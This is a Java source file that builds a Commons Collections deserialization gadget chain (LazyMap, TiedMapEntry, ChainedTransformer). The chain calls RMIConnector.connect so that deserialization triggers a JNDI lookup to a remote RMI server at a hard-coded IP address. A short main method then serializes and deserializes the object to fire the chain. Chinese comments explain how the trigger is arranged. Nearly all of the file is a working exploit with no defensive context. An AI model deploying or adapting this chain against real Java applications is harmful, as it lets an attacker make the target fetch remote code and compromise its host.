package org.example;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;
public class Rmiconnector_jndi {


    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        String path="rmi://10.37.129.2:1099/n51mis";
        JMXServiceURL jmxServiceURL=new JMXServiceURL("service:jmx:rmi://");
        RMIConnector rmiConnector=new RMIConnector(jmxServiceURL,null);
        setFieldValue(jmxServiceURL,"urlPath","/jndi/"+path);

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(rmiConnector),
                new InvokerTransformer("connect", null, null)
        };
        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        HashMap<Object,Object> map=new HashMap<>();
        Map<Object,Object> Lazymap= LazyMap.decorate(map,new ConstantTransformer(1)); //先设置为其它Transformer,使其put()方法不触发
        TiedMapEntry tiedMapEntry=new TiedMapEntry(Lazymap,"aaa");
        HashMap<Object,Object> map2=new HashMap<>();
        map2.put(tiedMapEntry,"bbb");
        Lazymap.remove("aaa"); //将key去掉,使它能进入transform()方法
        setFieldValue(Lazymap,"factory",chainedTransformer);
        unserialize(serialize(map2));


    }
    public static void setFieldValue(Object object,String fieldName,Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field=object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object,value);
    }
    public static byte[] serialize(Object object) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
        ObjectOutputStream outputStream=new ObjectOutputStream(byteArrayOutputStream);
        outputStream.writeObject(object);
        return byteArrayOutputStream.toByteArray();
    }
    public static void unserialize(byte[] ser) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream=new ObjectInputStream(new ByteArrayInputStream(ser));
        objectInputStream.readObject();

    }
}
